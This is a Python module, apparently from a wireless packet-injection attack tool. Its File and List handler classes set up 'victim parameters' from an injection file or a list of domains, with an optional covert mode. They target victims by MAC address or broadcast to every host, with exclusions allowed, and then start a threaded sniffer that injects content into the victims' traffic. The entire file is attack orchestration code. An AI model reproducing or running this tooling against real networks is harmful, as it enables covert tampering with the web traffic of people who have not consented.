from lib.packet_handler import PacketHandler
from lib.parameters import VictimParameters
from lib.sniffer import Sniffer
from lib.victim import Victim

class File(object):
    """Inject based upon a single file"""

    def handler(self, args, websites):
        """Handle injection without a domain list"""

        ## Victim parameters
        if args.covert:
            vp = VictimParameters(inject_file = args.injection, covert = args.covert)
        else:
            vp = VictimParameters(inject_file = args.injection)

        ## Broadcast mode
        if not args.t:
            if args.exclude_hosts is None:
                ph = PacketHandler(Args = args, i = args.i, victim_parameters = vp)
            else:
                ph = PacketHandler(Args = args, i = args.i, victim_parameters = vp, excluded = args.exclude_hosts)

        ## Targeted mode
        else:
            victims = []
            for victim in args.t:
                v1 = Victim(mac = victim, victim_parameters = vp)
                victims.append(v1)

            if args.exclude_hosts is None:
                ph = PacketHandler(Args = args, i = args.i, victims = victims)
            else:
                ph = PacketHandler(Args = args, i = args.i, victims = victims, excluded = args.exclude_hosts)

        ## Begin sniffing
        #snif = Sniffer(ph, m = args.m)
        snif = Sniffer(ph, args, m = args.m)
        snif.threaded_sniff(args) ## Here



class List(object):
    """Inject based upon a list of domains"""

    def handler(self, args, websites):
        """Handle domain list"""
        ## Victim parameters
        if args.covert:
            vp = VictimParameters(websites = websites, covert = args.covert)
        else:
            vp = VictimParameters(websites = websites)

        ## Broadcast mode
        if not args.t:
            if args.exclude_hosts is None:
                ph = PacketHandler(Args = args, i = args.i, victim_parameters = vp)
            else:
                ph = PacketHandler(Args = args, i = args.i, victim_parameters = vp, excluded = args.exclude_hosts)

        ## Targeted mode
        else:
            victims = []
            for victim in args.t:
                v1 = Victim(mac = victim, victim_parameters = vp)
                victims.append(v1)

            if args.exclude_hosts is None:
                ph = PacketHandler(Args = args, i = args.i, victims = victims)
            else:
                ph = PacketHandler(Args = args, i = args.i, victims = victims, excluded = args.exclude_hosts)

        ## Begin sniffing
        snif = Sniffer(ph, args, m = args.m)
        snif.threaded_sniff(args)
